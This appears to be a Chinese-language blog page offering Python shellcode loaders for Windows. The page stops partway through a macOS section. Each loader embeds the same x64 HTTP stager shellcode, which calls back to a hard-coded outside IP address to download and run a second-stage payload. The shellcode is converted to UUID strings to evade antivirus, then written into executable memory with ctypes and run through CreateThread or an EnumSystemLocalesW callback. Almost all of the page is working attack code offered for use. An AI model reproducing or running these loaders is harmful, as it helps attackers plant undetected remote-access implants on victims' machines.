<h4 id="利用python2脚本将shellcode转换成uuid"><a href="#利用python2脚本将shellcode转换成uuid" class="headerlink" title="利用python2脚本将shellcode转换成uuid"></a>利用python2脚本将shellcode转换成uuid</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">buf=<span class="string">&#x27;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x60\x11\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x74\x43\x43\x63\x00\x6f\xc7\xb5\xfb\x90\x23\x05\x5e\xfe\xbf\x26\xa1\x46\x4b\x36\x28\xe6\xd1\xab\x1f\xc4\x12\x9a\x19\x5f\x81\x42\x52\xef\x4b\xc3\x7c\xcf\x23\xea\x51\x00\x2e\xb8\xfa\xd5\xc5\xe6\xde\x0f\xe3\x56\x5f\xc9\x36\x70\x95\x75\x17\x6f\x16\x05\x5f\x43\xd2\xcb\x8d\x72\x59\xb3\xe1\x8f\x1a\x3d\x94\xc1\x6a\xa8\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x34\x2e\x30\x29\x0d\x0a\x00\x84\xfd\x1c\x74\xe3\xda\x9f\x6c\x3b\xf3\x5d\x2e\xfe\x41\x0e\x49\x8c\x4e\x85\x5a\x10\x24\xf9\x19\xb5\xbe\x48\xf3\xfe\xc2\x20\xa8\x49\xdd\xd7\xd8\x35\xd5\x1a\x02\x8d\xaa\xbd\xfa\x56\x1e\x89\x8e\x99\x12\xfc\x51\x96\x2d\xc7\x90\x1f\x3c\xc8\x14\xdb\x9a\x62\xf2\x40\x4f\x7a\x63\x86\x08\x2a\xec\x86\x82\x55\xef\xb8\x18\x88\x69\xe6\x9f\x6d\xce\x1e\x28\x2e\x16\xb2\xa6\x13\x75\xd2\xa7\x4c\xae\x7a\x58\xea\x5c\x74\xb1\xce\x15\x92\xb4\xd9\x75\x6f\x33\xc1\xe6\x71\x08\x60\x27\x39\x6d\x6c\xfe\xf6\x3a\xda\x6d\x66\x72\xc6\x01\x9a\xb5\x40\x4d\xa0\xce\xe8\xa5\x6f\x01\x54\x9c\xe3\x1f\x36\x78\xd8\x71\xc6\x7f\x36\x8f\x06\xf8\xed\xc2\x53\xcc\x78\xe6\x34\xb8\x9c\xe9\xeb\x47\xc7\xaf\x08\xbb\x46\xdc\x00\xdd\x20\x59\xa7\xab\xbc\x68\x1e\xbe\x43\xd5\x37\x39\x09\x25\x27\xb3\xaa\x06\x25\x5d\x51\x12\xf5\xc7\xfc\xb0\xa2\xec\x0d\xa3\x63\xcd\x9f\xc4\x16\x01\x5d\x8d\x5e\x3f\x60\x86\xf1\x15\x7a\x11\x39\xf3\x1b\xae\xa0\x13\xb7\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x33\x38\x2e\x32\x37\x2e\x31\x32\x00\x49\x96\x02\xd2&#x27;</span></span><br><span class="line">uuid_list = []</span><br><span class="line"><span class="built_in">hex</span> = binascii.hexlify(buf).decode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">hex</span> += <span class="string">&#x27;0&#x27;</span> * (<span class="number">32</span> - (<span class="built_in">len</span>(<span class="built_in">hex</span>) % <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">hex</span>),<span class="number">32</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\&quot;&#123;&#125;\&quot;,&quot;</span>.<span class="built_in">format</span>(uuid.UUID(bytes_le=binascii.unhexlify(<span class="built_in">hex</span>[i:i+<span class="number">32</span>]))))</span><br></pre></td></tr></table></figure>



<h4 id="python2-uuid加载器"><a href="#python2-uuid加载器" class="headerlink" title="python2 uuid加载器"></a>python2 uuid加载器</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x60\x11\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x31\x73\x68\x51\x00\x27\x6b\x08\x03\x3f\x21\xf1\xec\xd6\xc0\x3b\xae\xe3\xab\x55\x82\xf4\x40\xbc\x5b\x9f\xfa\x45\xbd\x37\x51\x3b\xe0\x0d\xa4\x3b\xb2\xd1\xf9\x74\xda\x3a\xd8\x44\xb1\x60\x84\xc5\x83\x10\x70\x5e\x54\x63\xc7\xf8\xf8\x74\x9b\x2b\x6a\x35\x08\xd5\x11\xa9\x32\x98\xec\xd8\x01\xf0\xc4\xae\x4b\x4b\x6c\xba\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x3b\x20\x4d\x41\x53\x50\x29\x0d\x0a\x00\x36\x33\x5a\x21\x1c\xe3\x65\x2d\x0e\x19\xa1\xd3\x4c\xf9\x56\xc3\x4e\x54\x7e\x1c\x21\x38\x30\xf3\xf7\x7f\x4a\x21\x52\xb8\x55\x9f\xd0\x0f\x25\x99\x79\x4a\x2b\xcc\xd7\x09\x95\x74\x3b\xee\x1c\xfa\xad\xbd\xec\x84\x00\xdb\xd8\x58\x89\xb8\xad\xd3\x86\x5b\xd3\x09\xc2\xcd\xb6\xfd\x9e\x9f\xb2\x26\xc8\xaa\xfc\x0e\xc9\xf8\xa2\xfd\x5c\x99\x91\xb7\x08\x11\xd8\x91\xde\xfe\x43\x95\x1c\x96\x29\x08\x55\x39\x21\x7d\x8c\xd5\xac\x46\x6e\x78\x65\x16\xb9\xf1\x53\xc6\x25\x76\x78\xd7\xfd\xdd\xb0\x7f\x40\xea\x7f\x68\xba\x6e\x5d\x99\x55\x5f\x11\xd9\x05\x90\x92\x2c\x9e\xb3\x75\x5e\x73\x72\x81\x4d\xe0\x00\xa6\x38\x0b\xed\xe5\x4e\xcb\x8d\xd1\x44\x12\xb3\xf8\xd0\x3a\xcc\xd6\x06\xf1\x36\x4f\x8e\x66\x39\x66\x42\xe3\xc7\x74\xa5\xbd\xac\x0d\xe6\xe5\xd3\x53\x0c\x8e\x90\xca\xd3\x01\x0d\x88\x7c\x91\x63\xdb\xe2\xd9\xb3\x4d\x9f\x57\x3b\x64\x31\x8a\x66\xea\x78\xeb\x07\x09\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x33\x38\x2e\x32\x37\x2e\x31\x32\x00\x49\x96\x02\xd2&quot;</span></span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    bytes_a = shellcode[i * <span class="number">16</span>: <span class="number">16</span> + i * <span class="number">16</span>]</span><br><span class="line">    b = uuid.UUID(bytes_le=bytes_a)</span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">str</span>(b))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(uuid_list)*<span class="number">16</span>), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line">ptr1 = ptr</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> uuid_list:</span><br><span class="line">    ctypes.windll.Rpcrt4.UuidFromStringA(j, ptr1)</span><br><span class="line">    ptr1 += <span class="number">16</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ptr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">shellcode=<span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x60\x11\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x31\x73\x68\x51\x00\x27\x6b\x08\x03\x3f\x21\xf1\xec\xd6\xc0\x3b\xae\xe3\xab\x55\x82\xf4\x40\xbc\x5b\x9f\xfa\x45\xbd\x37\x51\x3b\xe0\x0d\xa4\x3b\xb2\xd1\xf9\x74\xda\x3a\xd8\x44\xb1\x60\x84\xc5\x83\x10\x70\x5e\x54\x63\xc7\xf8\xf8\x74\x9b\x2b\x6a\x35\x08\xd5\x11\xa9\x32\x98\xec\xd8\x01\xf0\xc4\xae\x4b\x4b\x6c\xba\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x3b\x20\x4d\x41\x53\x50\x29\x0d\x0a\x00\x36\x33\x5a\x21\x1c\xe3\x65\x2d\x0e\x19\xa1\xd3\x4c\xf9\x56\xc3\x4e\x54\x7e\x1c\x21\x38\x30\xf3\xf7\x7f\x4a\x21\x52\xb8\x55\x9f\xd0\x0f\x25\x99\x79\x4a\x2b\xcc\xd7\x09\x95\x74\x3b\xee\x1c\xfa\xad\xbd\xec\x84\x00\xdb\xd8\x58\x89\xb8\xad\xd3\x86\x5b\xd3\x09\xc2\xcd\xb6\xfd\x9e\x9f\xb2\x26\xc8\xaa\xfc\x0e\xc9\xf8\xa2\xfd\x5c\x99\x91\xb7\x08\x11\xd8\x91\xde\xfe\x43\x95\x1c\x96\x29\x08\x55\x39\x21\x7d\x8c\xd5\xac\x46\x6e\x78\x65\x16\xb9\xf1\x53\xc6\x25\x76\x78\xd7\xfd\xdd\xb0\x7f\x40\xea\x7f\x68\xba\x6e\x5d\x99\x55\x5f\x11\xd9\x05\x90\x92\x2c\x9e\xb3\x75\x5e\x73\x72\x81\x4d\xe0\x00\xa6\x38\x0b\xed\xe5\x4e\xcb\x8d\xd1\x44\x12\xb3\xf8\xd0\x3a\xcc\xd6\x06\xf1\x36\x4f\x8e\x66\x39\x66\x42\xe3\xc7\x74\xa5\xbd\xac\x0d\xe6\xe5\xd3\x53\x0c\x8e\x90\xca\xd3\x01\x0d\x88\x7c\x91\x63\xdb\xe2\xd9\xb3\x4d\x9f\x57\x3b\x64\x31\x8a\x66\xea\x78\xeb\x07\x09\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x33\x38\x2e\x32\x37\x2e\x31\x32\x00\x49\x96\x02\xd2&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">UUIDConvert</span>(<span class="params">shellcode</span>):</span><br><span class="line">    uuid_shellcode = []</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(shellcode) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        null_byte = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">16</span> - <span class="built_in">len</span>(shellcode) % <span class="number">16</span>)</span><br><span class="line">        shellcode += null_byte</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">16</span>):</span><br><span class="line">        uuid_string = <span class="built_in">str</span>(uuid.UUID(bytes_le=shellcode[i: i + <span class="number">16</span>]))</span><br><span class="line">        uuid_shellcode.append(uuid_string)</span><br><span class="line">    <span class="keyword">return</span> uuid_shellcode</span><br><span class="line"></span><br><span class="line">uuid_shellcode = UUIDConvert(shellcode=shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctypes.windll.Activeds.AllocADsMem.restype = ctypes.c_uint64</span><br><span class="line">ptr_alloc = ctypes.windll.Activeds.AllocADsMem(ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">ptr_realloc = ctypes.windll.Activeds.ReallocADsMem(ptr_alloc, <span class="built_in">len</span>(shellcode), <span class="built_in">len</span>(shellcode))</span><br><span class="line">ctypes.windll.kernel32.VirtualProtect(ptr_realloc, ctypes.c_int(<span class="built_in">len</span>(shellcode)), <span class="number">0x40</span>, ctypes.byref(ctypes.c_long(<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">ptr = ptr_realloc</span><br><span class="line"><span class="keyword">for</span> code <span class="keyword">in</span> uuid_shellcode:</span><br><span class="line">    ctypes.windll.Rpcrt4.UuidFromStringA(code, ptr)</span><br><span class="line">    ptr += <span class="number">16</span></span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.EnumSystemLocalesW(ptr_realloc, <span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="python-mac内存加载"><a href="#python-mac内存加载" class="headerlink" title="python mac内存加载"></a>python mac内存加载</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/luochen2436/article/details/124035788">https://blog.csdn.net/luochen2436/article/details/124035788</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">shellcode=<span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x60\x11\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x31\x73\x68\x51\x00\x27\x6b\x08\x03\x3f\x21\xf1\xec\xd6\xc0\x3b\xae\xe3\xab\x55\x82\xf4\x40\xbc\x5b\x9f\xfa\x45\xbd\x37\x51\x3b\xe0\x0d\xa4\x3b\xb2\xd1\xf9\x74\xda\x3a\xd8\x44\xb1\x60\x84\xc5\x83\x10\x70\x5e\x54\x63\xc7\xf8\xf8\x74\x9b\x2b\x6a\x35\x08\xd5\x11\xa9\x32\x98\xec\xd8\x01\xf0\xc4\xae\x4b\x4b\x6c\xba\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x